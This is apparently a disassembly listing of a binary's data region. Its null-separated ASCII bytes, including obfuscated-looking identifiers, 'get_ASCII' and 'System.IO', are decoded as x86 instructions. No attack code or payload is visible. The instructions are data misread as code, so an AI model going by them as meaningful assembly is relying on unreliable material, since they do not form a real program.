  407b53:	47                   	inc    %edi
  407b54:	68 67 78 77 41       	push   $0x41777867
  407b59:	4e                   	dec    %esi
  407b5a:	4d                   	dec    %ebp
  407b5b:	46                   	inc    %esi
  407b5c:	48                   	dec    %eax
  407b5d:	00 77 76             	add    %dh,0x76(%edi)
  407b60:	58                   	pop    %eax
  407b61:	71 74                	jno    0x407bd7
  407b63:	55                   	push   %ebp
  407b64:	70 67                	jo     0x407bcd
  407b66:	52                   	push   %edx
  407b67:	48                   	dec    %eax
  407b68:	55                   	push   %ebp
  407b69:	4a                   	dec    %edx
  407b6a:	48                   	dec    %eax
  407b6b:	00 44 62 63          	add    %al,0x63(%edx,%eiz,2)
  407b6f:	68 4b 51 4a 4c       	push   $0x4c4a514b
  407b74:	59                   	pop    %ecx
  407b75:	4a                   	dec    %edx
  407b76:	48                   	dec    %eax
  407b77:	00 72 4a             	add    %dh,0x4a(%edx)
  407b7a:	65 75 57             	gs jne 0x407bd4
  407b7d:	4f                   	dec    %edi
  407b7e:	6d                   	insl   (%dx),%es:(%edi)
  407b7f:	69 6a 5a 48 00 65 6a 	imul   $0x6a650048,0x5a(%edx),%ebp
  407b86:	67 42                	addr16 inc %edx
  407b88:	4d                   	dec    %ebp
  407b89:	64 67 64 68 61 48 00 	fs addr16 fs push $0x6a004861
  407b90:	6a 
  407b91:	79 49                	jns    0x407bdc
  407b93:	53                   	push   %ebx
  407b94:	56                   	push   %esi
  407b95:	6c                   	insb   (%dx),%es:(%edi)
  407b96:	69 71 6d 47 57 64 48 	imul   $0x48645747,0x6d(%ecx),%esi
  407b9d:	00 4e 47             	add    %cl,0x47(%esi)
  407ba0:	62 50 72             	bound  %edx,0x72(%eax)
  407ba3:	47                   	inc    %edi
  407ba4:	53                   	push   %ebx
  407ba5:	78 59                	js     0x407c00
  407ba7:	65 4a                	gs dec %edx
  407ba9:	5a                   	pop    %edx
  407baa:	70 66                	jo     0x407c12
  407bac:	48                   	dec    %eax
  407bad:	00 59 78             	add    %bl,0x78(%ecx)
  407bb0:	49                   	dec    %ecx
  407bb1:	57                   	push   %edi
  407bb2:	66 75 4c             	data16 jne 0x407c01
  407bb5:	76 75                	jbe    0x407c2c
  407bb7:	55                   	push   %ebp
  407bb8:	44                   	inc    %esp
  407bb9:	42                   	inc    %edx
  407bba:	53                   	push   %ebx
  407bbb:	54                   	push   %esp
  407bbc:	75 48                	jne    0x407c06
  407bbe:	00 41 65             	add    %al,0x65(%ecx)
  407bc1:	76 76                	jbe    0x407c39
  407bc3:	6b 63 4b 62          	imul   $0x62,0x4b(%ebx),%esp
  407bc7:	5a                   	pop    %edx
  407bc8:	4e                   	dec    %esi
  407bc9:	4b                   	dec    %ebx
  407bca:	6d                   	insl   (%dx),%es:(%edi)
  407bcb:	76 48                	jbe    0x407c15
  407bcd:	00 4f 61             	add    %cl,0x61(%edi)
  407bd0:	48                   	dec    %eax
  407bd1:	51                   	push   %ecx
  407bd2:	59                   	pop    %ecx
  407bd3:	76 42                	jbe    0x407c17
  407bd5:	78 46                	js     0x407c1d
  407bd7:	6f                   	outsl  %ds:(%esi),(%dx)
  407bd8:	42                   	inc    %edx
  407bd9:	49                   	dec    %ecx
  407bda:	00 43 71             	add    %al,0x71(%ebx)
  407bdd:	42                   	inc    %edx
  407bde:	55                   	push   %ebp
  407bdf:	49                   	dec    %ecx
  407be0:	79 54                	jns    0x407c36
  407be2:	63 47 49             	arpl   %eax,0x49(%edi)
  407be5:	00 46 6b             	add    %al,0x6b(%esi)
  407be8:	4e                   	dec    %esi
  407be9:	4a                   	dec    %edx
  407bea:	4e                   	dec    %esi
  407beb:	73 41                	jae    0x407c2e
  407bed:	77 6e                	ja     0x407c5d
  407bef:	68 47 49 00 67       	push   $0x67004947
  407bf4:	65 74 5f             	gs je  0x407c56
  407bf7:	41                   	inc    %ecx
  407bf8:	53                   	push   %ebx
  407bf9:	43                   	inc    %ebx
  407bfa:	49                   	dec    %ecx
  407bfb:	49                   	dec    %ecx
  407bfc:	00 58 78             	add    %bl,0x78(%eax)
  407bff:	56                   	push   %esi
  407c00:	64 4b                	fs dec %ebx
  407c02:	7a 57                	jp     0x407c5b
  407c04:	6f                   	outsl  %ds:(%esi),(%dx)
  407c05:	57                   	push   %edi
  407c06:	49                   	dec    %ecx
  407c07:	00 75 46             	add    %dh,0x46(%ebp)
  407c0a:	59                   	pop    %ecx
  407c0b:	47                   	inc    %edi
  407c0c:	79 67                	jns    0x407c75
  407c0e:	61                   	popa
  407c0f:	45                   	inc    %ebp
  407c10:	71 6d                	jno    0x407c7f
  407c12:	58                   	pop    %eax
  407c13:	59                   	pop    %ecx
  407c14:	49                   	dec    %ecx
  407c15:	00 4e 6b             	add    %cl,0x6b(%esi)
  407c18:	7a 56                	jp     0x407c70
  407c1a:	77 74                	ja     0x407c90
  407c1c:	4f                   	dec    %edi
  407c1d:	54                   	push   %esp
  407c1e:	72 48                	jb     0x407c68
  407c20:	4c                   	dec    %esp
  407c21:	6d                   	insl   (%dx),%es:(%edi)
  407c22:	47                   	inc    %edi
  407c23:	61                   	popa
  407c24:	49                   	dec    %ecx
  407c25:	00 4a 73             	add    %cl,0x73(%edx)
  407c28:	50                   	push   %eax
  407c29:	64 46                	fs inc %esi
  407c2b:	4f                   	dec    %edi
  407c2c:	46                   	inc    %esi
  407c2d:	4d                   	dec    %ebp
  407c2e:	75 73                	jne    0x407ca3
  407c30:	75 67                	jne    0x407c99
  407c32:	44                   	inc    %esp
  407c33:	4a                   	dec    %edx
  407c34:	00 47 44             	add    %al,0x44(%edi)
  407c37:	71 6d                	jno    0x407ca6
  407c39:	4a                   	dec    %edx
  407c3a:	4c                   	dec    %esp
  407c3b:	4b                   	dec    %ebx
  407c3c:	47                   	inc    %edi
  407c3d:	74 49                	je     0x407c88
  407c3f:	6b 44 4a 00 54       	imul   $0x54,0x0(%edx,%ecx,2),%eax
  407c44:	42                   	inc    %edx
  407c45:	54                   	push   %esp
  407c46:	75 43                	jne    0x407c8b
  407c48:	58                   	pop    %eax
  407c49:	7a 62                	jp     0x407cad
  407c4b:	7a 46                	jp     0x407c93
  407c4d:	6f                   	outsl  %ds:(%esi),(%dx)
  407c4e:	4a                   	dec    %edx
  407c4f:	00 4b 55             	add    %cl,0x55(%ebx)
  407c52:	51                   	push   %ecx
  407c53:	57                   	push   %edi
  407c54:	76 6c                	jbe    0x407cc2
  407c56:	74 61                	je     0x407cb9
  407c58:	74 4a                	je     0x407ca4
  407c5a:	70 4a                	jo     0x407ca6
  407c5c:	00 6b 61             	add    %ch,0x61(%ebx)
  407c5f:	6d                   	insl   (%dx),%es:(%edi)
  407c60:	47                   	inc    %edi
  407c61:	4d                   	dec    %ebp
  407c62:	59                   	pop    %ecx
  407c63:	67 61                	addr16 popa
  407c65:	66 68 41 55          	pushw  $0x5541
  407c69:	72 4a                	jb     0x407cb5
  407c6b:	00 61 78             	add    %ah,0x78(%ecx)
  407c6e:	6f                   	outsl  %ds:(%esi),(%dx)
  407c6f:	48                   	dec    %eax
  407c70:	77 55                	ja     0x407cc7
  407c72:	48                   	dec    %eax
  407c73:	55                   	push   %ebp
  407c74:	62 55 45             	bound  %edx,0x45(%ebp)
  407c77:	4b                   	dec    %ebx
  407c78:	00 46 71             	add    %al,0x71(%esi)
  407c7b:	48                   	dec    %eax
  407c7c:	4c                   	dec    %esp
  407c7d:	76 6a                	jbe    0x407ce9
  407c7f:	77 78                	ja     0x407cf9
  407c81:	49                   	dec    %ecx
  407c82:	56                   	push   %esi
  407c83:	43                   	inc    %ebx
  407c84:	58                   	pop    %eax
  407c85:	45                   	inc    %ebp
  407c86:	4b                   	dec    %ebx
  407c87:	00 6d 65             	add    %ch,0x65(%ebp)
  407c8a:	42                   	inc    %edx
  407c8b:	70 65                	jo     0x407cf2
  407c8d:	59                   	pop    %ecx
  407c8e:	5a                   	pop    %edx
  407c8f:	51                   	push   %ecx
  407c90:	69 49 45 47 4b 00 50 	imul   $0x50004b47,0x45(%ecx),%ecx
  407c97:	45                   	inc    %ebp
  407c98:	42                   	inc    %edx
  407c99:	45                   	inc    %ebp
  407c9a:	57                   	push   %edi
  407c9b:	42                   	inc    %edx
  407c9c:	4a                   	dec    %edx
  407c9d:	4c                   	dec    %esp
  407c9e:	58                   	pop    %eax
  407c9f:	4f                   	dec    %edi
  407ca0:	4d                   	dec    %ebp
  407ca1:	4a                   	dec    %edx
  407ca2:	4b                   	dec    %ebx
  407ca3:	00 43 6d             	add    %al,0x6d(%ebx)
  407ca6:	6b 72 72 6c          	imul   $0x6c,0x72(%edx),%esi
  407caa:	50                   	push   %eax
  407cab:	67 72 54             	addr16 jb 0x407d02
  407cae:	63 78 70             	arpl   %edi,0x70(%eax)
  407cb1:	50                   	push   %eax
  407cb2:	4b                   	dec    %ebx
  407cb3:	00 53 42             	add    %dl,0x42(%ebx)
  407cb6:	63 6c 6b 58          	arpl   %ebp,0x58(%ebx,%ebp,2)
  407cba:	56                   	push   %esi
  407cbb:	5a                   	pop    %edx
  407cbc:	52                   	push   %edx
  407cbd:	41                   	inc    %ecx
  407cbe:	61                   	popa
  407cbf:	51                   	push   %ecx
  407cc0:	4b                   	dec    %ebx
  407cc1:	00 6c 41 5a          	add    %ch,0x5a(%ecx,%eax,2)
  407cc5:	6e                   	outsb  %ds:(%esi),(%dx)
  407cc6:	48                   	dec    %eax
  407cc7:	4d                   	dec    %ebp
  407cc8:	52                   	push   %edx
  407cc9:	4d                   	dec    %ebp
  407cca:	72 76                	jb     0x407d42
  407ccc:	61                   	popa
  407ccd:	6c                   	insb   (%dx),%es:(%edi)
  407cce:	59                   	pop    %ecx
  407ccf:	4b                   	dec    %ebx
  407cd0:	00 71 53             	add    %dh,0x53(%ecx)
  407cd3:	4a                   	dec    %edx
  407cd4:	73 4a                	jae    0x407d20
  407cd6:	6d                   	insl   (%dx),%es:(%edi)
  407cd7:	4a                   	dec    %edx
  407cd8:	72 53                	jb     0x407d2d
  407cda:	66 4b                	dec    %bx
  407cdc:	00 58 46             	add    %bl,0x46(%eax)
  407cdf:	76 4d                	jbe    0x407d2e
  407ce1:	65 46                	gs inc %esi
  407ce3:	76 73                	jbe    0x407d58
  407ce5:	6c                   	insb   (%dx),%es:(%edi)
  407ce6:	54                   	push   %esp
  407ce7:	4e                   	dec    %esi
  407ce8:	44                   	inc    %esp
  407ce9:	6e                   	outsb  %ds:(%esi),(%dx)
  407cea:	4b                   	dec    %ebx
  407ceb:	00 6f 65             	add    %ch,0x65(%edi)
  407cee:	76 79                	jbe    0x407d69
  407cf0:	42                   	inc    %edx
  407cf1:	55                   	push   %ebp
  407cf2:	6d                   	insl   (%dx),%es:(%edi)
  407cf3:	48                   	dec    %eax
  407cf4:	4b                   	dec    %ebx
  407cf5:	6e                   	outsb  %ds:(%esi),(%dx)
  407cf6:	51                   	push   %ecx
  407cf7:	73 4a                	jae    0x407d43
  407cf9:	6f                   	outsl  %ds:(%esi),(%dx)
  407cfa:	4b                   	dec    %ebx
  407cfb:	00 77 45             	add    %dh,0x45(%edi)
  407cfe:	46                   	inc    %esi
  407cff:	47                   	inc    %edi
  407d00:	48                   	dec    %eax
  407d01:	67 45                	addr16 inc %ebp
  407d03:	71 66                	jno    0x407d6b
  407d05:	48                   	dec    %eax
  407d06:	64 75 75             	fs jne 0x407d7e
  407d09:	4b                   	dec    %ebx
  407d0a:	00 51 4c             	add    %dl,0x4c(%ecx)
  407d0d:	57                   	push   %edi
  407d0e:	64 76 43             	fs jbe 0x407d54
  407d11:	4e                   	dec    %esi
  407d12:	5a                   	pop    %edx
  407d13:	4b                   	dec    %ebx
  407d14:	74 44                	je     0x407d5a
  407d16:	76 4b                	jbe    0x407d63
  407d18:	00 65 6e             	add    %ah,0x6e(%ebp)
  407d1b:	5a                   	pop    %edx
  407d1c:	5a                   	pop    %edx
  407d1d:	5a                   	pop    %edx
  407d1e:	50                   	push   %eax
  407d1f:	69 55 5a 67 41 4c 00 	imul   $0x4c4167,0x5a(%ebp),%edx
  407d26:	44                   	inc    %esp
  407d27:	69 6a 78 78 74 50 56 	imul   $0x56507478,0x78(%edx),%ebp
  407d2e:	48                   	dec    %eax
  407d2f:	45                   	inc    %ebp
  407d30:	54                   	push   %esp
  407d31:	47                   	inc    %edi
  407d32:	44                   	inc    %esp
  407d33:	4c                   	dec    %esp
  407d34:	00 4b 6e             	add    %cl,0x6e(%ebx)
  407d37:	6d                   	insl   (%dx),%es:(%edi)
  407d38:	77 6c                	ja     0x407da6
  407d3a:	58                   	pop    %eax
  407d3b:	65 6f                	outsl  %gs:(%esi),(%dx)
  407d3d:	69 4d 58 53 46 4e 44 	imul   $0x444e4653,0x58(%ebp),%ecx
  407d44:	4c                   	dec    %esp
  407d45:	00 57 42             	add    %dl,0x42(%edi)
  407d48:	4d                   	dec    %ebp
  407d49:	71 74                	jno    0x407dbf
  407d4b:	76 75                	jbe    0x407dc2
  407d4d:	53                   	push   %ebx
  407d4e:	58                   	pop    %eax
  407d4f:	51                   	push   %ecx
  407d50:	49                   	dec    %ecx
  407d51:	4c                   	dec    %esp
  407d52:	00 66 6d             	add    %ah,0x6d(%esi)
  407d55:	45                   	inc    %ebp
  407d56:	70 77                	jo     0x407dcf
  407d58:	57                   	push   %edi
  407d59:	51                   	push   %ecx
  407d5a:	78 74                	js     0x407dd0
  407d5c:	74 6b                	je     0x407dc9
  407d5e:	6f                   	outsl  %ds:(%esi),(%dx)
  407d5f:	4c                   	dec    %esp
  407d60:	4c                   	dec    %esp
  407d61:	00 50 4c             	add    %dl,0x4c(%eax)
  407d64:	65 41                	gs inc %ecx
  407d66:	73 4a                	jae    0x407db2
  407d68:	76 6d                	jbe    0x407dd7
  407d6a:	4a                   	dec    %edx
  407d6b:	72 4d                	jb     0x407dba
  407d6d:	4c                   	dec    %esp
  407d6e:	00 41 58             	add    %al,0x58(%ecx)
  407d71:	75 56                	jne    0x407dc9
  407d73:	67 58                	addr16 pop %eax
  407d75:	57                   	push   %edi
  407d76:	6f                   	outsl  %ds:(%esi),(%dx)
  407d77:	6b 69 42 51          	imul   $0x51,0x42(%ecx),%ebp
  407d7b:	4e                   	dec    %esi
  407d7c:	4c                   	dec    %esp
  407d7d:	00 69 43             	add    %ch,0x43(%ecx)
  407d80:	7a 61                	jp     0x407de3
  407d82:	44                   	inc    %esp
  407d83:	79 67                	jns    0x407dec
  407d85:	79 77                	jns    0x407dfe
  407d87:	41                   	inc    %ecx
  407d88:	62 4c 00 7a          	bound  %ecx,0x7a(%eax,%eax,1)
  407d8c:	4c                   	dec    %esp
  407d8d:	44                   	inc    %esp
  407d8e:	76 6b                	jbe    0x407dfb
  407d90:	44                   	inc    %esp
  407d91:	75 54                	jne    0x407de7
  407d93:	70 4c                	jo     0x407de1
  407d95:	00 69 49             	add    %ch,0x49(%ecx)
  407d98:	64 4b                	fs dec %ebx
  407d9a:	4e                   	dec    %esi
  407d9b:	51                   	push   %ecx
  407d9c:	4e                   	dec    %esi
  407d9d:	47                   	inc    %edi
  407d9e:	4d                   	dec    %ebp
  407d9f:	4b                   	dec    %ebx
  407da0:	42                   	inc    %edx
  407da1:	4d                   	dec    %ebp
  407da2:	47                   	inc    %edi
  407da3:	4d                   	dec    %ebp
  407da4:	00 64 47 4d          	add    %ah,0x4d(%edi,%eax,2)
  407da8:	44                   	inc    %esp
  407da9:	4a                   	dec    %edx
  407daa:	6f                   	outsl  %ds:(%esi),(%dx)
  407dab:	64 55                	fs push %ebp
  407dad:	52                   	push   %edx
  407dae:	59                   	pop    %ecx
  407daf:	4d                   	dec    %ebp
  407db0:	00 53 61             	add    %dl,0x61(%ebx)
  407db3:	57                   	push   %edi
  407db4:	45                   	inc    %ebp
  407db5:	6a 51                	push   $0x51
  407db7:	74 49                	je     0x407e02
  407db9:	45                   	inc    %ebp
  407dba:	6f                   	outsl  %ds:(%esi),(%dx)
  407dbb:	4d                   	dec    %ebp
  407dbc:	00 43 70             	add    %al,0x70(%ebx)
  407dbf:	58                   	pop    %eax
  407dc0:	77 65                	ja     0x407e27
  407dc2:	70 70                	jo     0x407e34
  407dc4:	6b 6c 6b 47 6f       	imul   $0x6f,0x47(%ebx,%ebp,2),%ebp
  407dc9:	4d                   	dec    %ebp
  407dca:	00 6a 6b             	add    %ch,0x6b(%edx)
  407dcd:	69 72 4b 7a 41 55 4e 	imul   $0x4e55417a,0x4b(%edx),%esi
  407dd4:	4d                   	dec    %ebp
  407dd5:	75 4d                	jne    0x407e24
  407dd7:	00 53 57             	add    %dl,0x57(%ebx)
  407dda:	63 6d 49             	arpl   %ebp,0x49(%ebp)
  407ddd:	6c                   	insb   (%dx),%es:(%edi)
  407dde:	55                   	push   %ebp
  407ddf:	71 65                	jno    0x407e46
  407de1:	54                   	push   %esp
  407de2:	47                   	inc    %edi
  407de3:	77 4d                	ja     0x407e32
  407de5:	00 43 55             	add    %al,0x55(%ebx)
  407de8:	49                   	dec    %ecx
  407de9:	63 47 65             	arpl   %eax,0x65(%edi)
  407dec:	78 42                	js     0x407e30
  407dee:	4c                   	dec    %esp
  407def:	4b                   	dec    %ebx
  407df0:	43                   	inc    %ebx
  407df1:	4e                   	dec    %esi
  407df2:	00 4f 63             	add    %cl,0x63(%edi)
  407df5:	49                   	dec    %ecx
  407df6:	71 65                	jno    0x407e5d
  407df8:	64 46                	fs inc %esi
  407dfa:	4e                   	dec    %esi
  407dfb:	79 43                	jns    0x407e40
  407dfd:	4e                   	dec    %esi
  407dfe:	00 62 5a             	add    %ah,0x5a(%edx)
  407e01:	41                   	inc    %ecx
  407e02:	68 41 4f 41 54       	push   $0x54414f41
  407e07:	67 6b 62 4e 00       	imul   $0x0,0x4e(%bp,%si),%esp
  407e0c:	70 51                	jo     0x407e5f
  407e0e:	6c                   	insb   (%dx),%es:(%edi)
  407e0f:	54                   	push   %esp
  407e10:	5a                   	pop    %edx
  407e11:	43                   	inc    %ebx
  407e12:	49                   	dec    %ecx
  407e13:	45                   	inc    %ebp
  407e14:	64 6a 62             	fs push $0x62
  407e17:	73 65                	jae    0x407e7e
  407e19:	63 4e 00             	arpl   %ecx,0x0(%esi)
  407e1c:	43                   	inc    %ebx
  407e1d:	6c                   	insb   (%dx),%es:(%edi)
  407e1e:	77 49                	ja     0x407e69
  407e20:	69 75 74 63 5a 63 78 	imul   $0x78635a63,0x74(%ebp),%esi
  407e27:	70 4e                	jo     0x407e77
  407e29:	00 4a 49             	add    %cl,0x49(%edx)
  407e2c:	41                   	inc    %ecx
  407e2d:	78 4f                	js     0x407e7e
  407e2f:	79 45                	jns    0x407e76
  407e31:	44                   	inc    %esp
  407e32:	45                   	inc    %ebp
  407e33:	44                   	inc    %esp
  407e34:	78 4e                	js     0x407e84
  407e36:	00 67 6e             	add    %ah,0x6e(%edi)
  407e39:	71 57                	jno    0x407e92
  407e3b:	41                   	inc    %ecx
  407e3c:	42                   	inc    %edx
  407e3d:	73 50                	jae    0x407e8f
  407e3f:	41                   	inc    %ecx
  407e40:	53                   	push   %ebx
  407e41:	76 70                	jbe    0x407eb3
  407e43:	79 4e                	jns    0x407e93
  407e45:	00 53 79             	add    %dl,0x79(%ebx)
  407e48:	73 74                	jae    0x407ebe
  407e4a:	65 6d                	gs insl (%dx),%es:(%edi)
  407e4c:	2e 49                	cs dec %ecx
  407e4e:	4f                   	dec    %edi
  407e4f:	00 41 63             	add    %al,0x63(%ecx)
  407e52:	75 6e                	jne    0x407ec2
  407e54:	58                   	pop    %eax
  407e55:	56                   	push   %esi
  407e56:	74 55                	je     0x407ead
  407e58:	58                   	pop    %eax
  407e59:	68 73 79 54 4f       	push   $0x4f547973
  407e5e:	00 7a 56             	add    %bh,0x56(%edx)
  407e61:	68 72 51 50 49       	push   $0x49505172
  407e66:	5a                   	pop    %edx
  407e67:	55                   	push   %ebp
  407e68:	4f                   	dec    %edi
  407e69:	00 58 4c             	add    %bl,0x4c(%eax)
  407e6c:	44                   	inc    %esp
  407e6d:	53                   	push   %ebx
  407e6e:	62 56 48             	bound  %edx,0x48(%esi)
  407e71:	6a 73                	push   $0x73
  407e73:	69 53 45 4d 61 56 4f 	imul   $0x4f56614d,0x45(%ebx),%edx
  407e7a:	00 6a 42             	add    %ch,0x42(%edx)
  407e7d:	75 5a                	jne    0x407ed9
  407e7f:	56                   	push   %esi
  407e80:	56                   	push   %esi
  407e81:	77 6d                	ja     0x407ef0
  407e83:	42                   	inc    %edx
  407e84:	6e                   	outsb  %ds:(%esi),(%dx)
  407e85:	66 4f                	dec    %di
  407e87:	00 51 65             	add    %dl,0x65(%ecx)
  407e8a:	6b 5a 58 54          	imul   $0x54,0x58(%edx),%ebx
  407e8e:	4a                   	dec    %edx
  407e8f:	57                   	push   %edi
  407e90:	46                   	inc    %esi
  407e91:	49                   	dec    %ecx
  407e92:	79 4f                	jns    0x407ee3
  407e94:	00 49 6a             	add    %cl,0x6a(%ecx)
  407e97:	69 61 66 69 67 64 46 	imul   $0x46646769,0x66(%ecx),%esp
  407e9e:	46                   	inc    %esi
  407e9f:	4e                   	dec    %esi
  407ea0:	50                   	push   %eax
  407ea1:	00 6a 53             	add    %ch,0x53(%edx)
  407ea4:	54                   	push   %esp
  407ea5:	72 63                	jb     0x407f0a
  407ea7:	63 6f 6b             	arpl   %ebp,0x6b(%edi)
  407eaa:	67 63 65 58          	arpl   %esp,0x58(%di)
  407eae:	50                   	push   %eax
  407eaf:	00 58 58             	add    %bl,0x58(%eax)
  407eb2:	4a                   	dec    %edx
  407eb3:	6e                   	outsb  %ds:(%esi),(%dx)
  407eb4:	41                   	inc    %ecx
  407eb5:	7a 4c                	jp     0x407f03
  407eb7:	4a                   	dec    %edx
  407eb8:	56                   	push   %esi
  407eb9:	63 50 00             	arpl   %edx,0x0(%eax)
  407ebc:	42                   	inc    %edx
  407ebd:	6a 66                	push   $0x66
  407ebf:	74 57                	je     0x407f18
  407ec1:	69 57 7a 63 50 00 6d 	imul   $0x6d005063,0x7a(%edi),%edx
  407ec8:	65 48                	gs dec %eax
  407eca:	43                   	inc    %ebx
  407ecb:	44                   	inc    %esp
  407ecc:	52                   	push   %edx
  407ecd:	75 6d                	jne    0x407f3c
  407ecf:	6b 63 47 64          	imul   $0x64,0x47(%ebx),%esp
  407ed3:	50                   	push   %eax
  407ed4:	00 56 50             	add    %dl,0x50(%esi)
  407ed7:	52                   	push   %edx
  407ed8:	73 4a                	jae    0x407f24
  407eda:	47                   	inc    %edi
  407edb:	57                   	push   %edi
  407edc:	73 43                	jae    0x407f21
  407ede:	72 50                	jb     0x407f30
  407ee0:	00 6a 6c             	add    %ch,0x6c(%edx)
  407ee3:	54                   	push   %esp
  407ee4:	76 4b                	jbe    0x407f31
  407ee6:	41                   	inc    %ecx
  407ee7:	43                   	inc    %ebx
  407ee8:	54                   	push   %esp
  407ee9:	50                   	push   %eax
  407eea:	5a                   	pop    %edx
  407eeb:	74 71                	je     0x407f5e
  407eed:	76 50                	jbe    0x407f3f
  407eef:	00 62 54             	add    %ah,0x54(%edx)
  407ef2:	4b                   	dec    %ebx
  407ef3:	74 4f                	je     0x407f44
  407ef5:	75 64                	jne    0x407f5b
  407ef7:	4e                   	dec    %esi
  407ef8:	73 5a                	jae    0x407f54
  407efa:	7a 50                	jp     0x407f4c
  407efc:	00 55 76             	add    %dl,0x76(%ebp)
  407eff:	79 79                	jns    0x407f7a
  407f01:	74 69                	je     0x407f6c
  407f03:	7a 70                	jp     0x407f75
  407f05:	4b                   	dec    %ebx
  407f06:	61                   	popa
  407f07:	47                   	inc    %edi
  407f08:	74 61                	je     0x407f6b
  407f0a:	42                   	inc    %edx
  407f0b:	51                   	push   %ecx
  407f0c:	00 63 48             	add    %ah,0x48(%ebx)
  407f0f:	78 6a                	js     0x407f7b
  407f11:	79 49                	jns    0x407f5c
  407f13:	43                   	inc    %ebx
  407f14:	55                   	push   %ebp
  407f15:	46                   	inc    %esi
  407f16:	6b 71 45 51          	imul   $0x51,0x45(%ecx),%esi
  407f1a:	00 48 53             	add    %cl,0x53(%eax)
  407f1d:	42                   	inc    %edx
  407f1e:	54                   	push   %esp
  407f1f:	43                   	inc    %ebx
  407f20:	6e                   	outsb  %ds:(%esi),(%dx)
  407f21:	51                   	push   %ecx
  407f22:	62 77 4a             	bound  %esi,0x4a(%edi)
  407f25:	70 52                	jo     0x407f79
  407f27:	51                   	push   %ecx
  407f28:	00 70 6e             	add    %dh,0x6e(%eax)
  407f2b:	50                   	push   %eax
  407f2c:	76 6d                	jbe    0x407f9b
  407f2e:	64 64 52             	fs fs push %edx
  407f31:	72 44                	jb     0x407f77
  407f33:	77 42                	ja     0x407f77
  407f35:	41                   	inc    %ecx
  407f36:	67 51                	addr16 push %ecx
  407f38:	00 62 76             	add    %ah,0x76(%edx)
  407f3b:	77 70                	ja     0x407fad
  407f3d:	50                   	push   %eax
  407f3e:	69 6c 61 68 51 00 59 	imul   $0x71590051,0x68(%ecx,%eiz,2),%ebp
  407f45:	71 
  407f46:	51                   	push   %ecx
  407f47:	69 45 7a 46 59 54 74 	imul   $0x74545946,0x7a(%ebp),%eax
  407f4e:	51                   	push   %ecx
  407f4f:	00 4a 6a             	add    %cl,0x6a(%edx)
  407f52:	52                   	push   %edx
  407f53:	58                   	pop    %eax
  407f54:	6c                   	insb   (%dx),%es:(%edi)
  407f55:	72 4e                	jb     0x407fa5
  407f57:	6b 55 53 64          	imul   $0x64,0x53(%ebp),%edx
  407f5b:	59                   	pop    %ecx
  407f5c:	71 74                	jno    0x407fd2
  407f5e:	51                   	push   %ecx
  407f5f:	00 71 42             	add    %dh,0x42(%ecx)
  407f62:	58                   	pop    %eax
  407f63:	79 51                	jns    0x407fb6
  407f65:	54                   	push   %esp
  407f66:	6f                   	outsl  %ds:(%esi),(%dx)
  407f67:	47                   	inc    %edi
  407f68:	59                   	pop    %ecx
  407f69:	7a 51                	jp     0x407fbc
  407f6b:	00 62 62             	add    %ah,0x62(%edx)
  407f6e:	7a 7a                	jp     0x407fea
  407f70:	72 79                	jb     0x407feb
  407f72:	6c                   	insb   (%dx),%es:(%edi)
  407f73:	72 41                	jb     0x407fb6
  407f75:	41                   	inc    %ecx
  407f76:	52                   	push   %edx
  407f77:	00 4d 47             	add    %cl,0x47(%ebp)
  407f7a:	65 74 70             	gs je  0x407fed
  407f7d:	41                   	inc    %ecx
  407f7e:	56                   	push   %esi
  407f7f:	4b                   	dec    %ebx
  407f80:	45                   	inc    %ebp
  407f81:	6d                   	insl   (%dx),%es:(%edi)
  407f82:	56                   	push   %esi
  407f83:	44                   	inc    %esp
  407f84:	52                   	push   %edx
  407f85:	00 59 48             	add    %bl,0x48(%ecx)
  407f88:	5a                   	pop    %edx
  407f89:	45                   	inc    %ebp
  407f8a:	6a 71                	push   $0x71
  407f8c:	48                   	dec    %eax
  407f8d:	4d                   	dec    %ebp
  407f8e:	77 76                	ja     0x408006
  407f90:	6d                   	insl   (%dx),%es:(%edi)
  407f91:	77 58                	ja     0x407feb
  407f93:	52                   	push   %edx
  407f94:	00 77 4d             	add    %dh,0x4d(%edi)
  407f97:	51                   	push   %ecx
  407f98:	4d                   	dec    %ebp
  407f99:	74 42                	je     0x407fdd
  407f9b:	54                   	push   %esp
  407f9c:	56                   	push   %esi
  407f9d:	44                   	inc    %esp
  407f9e:	73 76                	jae    0x408016
  407fa0:	61                   	popa
  407fa1:	63 52 00             	arpl   %edx,0x0(%edx)
  407fa4:	4a                   	dec    %edx
  407fa5:	68 46 6a 74 61       	push   $0x61746a46
  407faa:	6e                   	outsb  %ds:(%esi),(%dx)
  407fab:	4d                   	dec    %ebp
  407fac:	51                   	push   %ecx
  407fad:	66 79 53             	data16 jns 0x408003
  407fb0:	55                   	push   %ebp
  407fb1:	78 7a                	js     0x40802d
  407fb3:	6b 52 00 4e          	imul   $0x4e,0x0(%edx),%edx
  407fb7:	79 53                	jns    0x40800c
  407fb9:	47                   	inc    %edi
  407fba:	54                   	push   %esp
  407fbb:	4e                   	dec    %esi
  407fbc:	51                   	push   %ecx
  407fbd:	6b 66 62 76          	imul   $0x76,0x62(%esi),%esp
  407fc1:	52                   	push   %edx
  407fc2:	00 44 4b 49          	add    %al,0x49(%ebx,%ecx,2)
  407fc6:	6c                   	insb   (%dx),%es:(%edi)
  407fc7:	4e                   	dec    %esi
  407fc8:	59                   	pop    %ecx
  407fc9:	71 78                	jno    0x408043
  407fcb:	55                   	push   %ebp
  407fcc:	45                   	inc    %ebp
  407fcd:	42                   	inc    %edx
  407fce:	77 52                	ja     0x408022
  407fd0:	00 74 42 4c          	add    %dh,0x4c(%edx,%eax,2)
  407fd4:	4e                   	dec    %esi
  407fd5:	61                   	popa
  407fd6:	65 44                	gs inc %esp
  407fd8:	72 68                	jb     0x408042
  407fda:	49                   	dec    %ecx
  407fdb:	70 77                	jo     0x408054
  407fdd:	52                   	push   %edx
  407fde:	00 52 4d             	add    %dl,0x4d(%edx)
  407fe1:	49                   	dec    %ecx
  407fe2:	6c                   	insb   (%dx),%es:(%edi)
  407fe3:	55                   	push   %ebp
  407fe4:	7a 57                	jp     0x40803d
  407fe6:	67 47                	addr16 inc %edi
  407fe8:	47                   	inc    %edi
  407fe9:	53                   	push   %ebx
  407fea:	00 48 62             	add    %cl,0x62(%eax)
  407fed:	66 74 59             	data16 je 0x408049
  407ff0:	41                   	inc    %ecx
  407ff1:	7a 50                	jp     0x408043
  407ff3:	70 6c                	jo     0x408061
  407ff5:	69 71 53 53 00 41 57 	imul   $0x57410053,0x53(%ecx),%esi
  407ffc:	57                   	push   %edi
  407ffd:	70 78                	jo     0x408077
  407fff:	47                   	inc    %edi
  408000:	67 47                	addr16 inc %edi
  408002:	72 63                	jb     0x408067
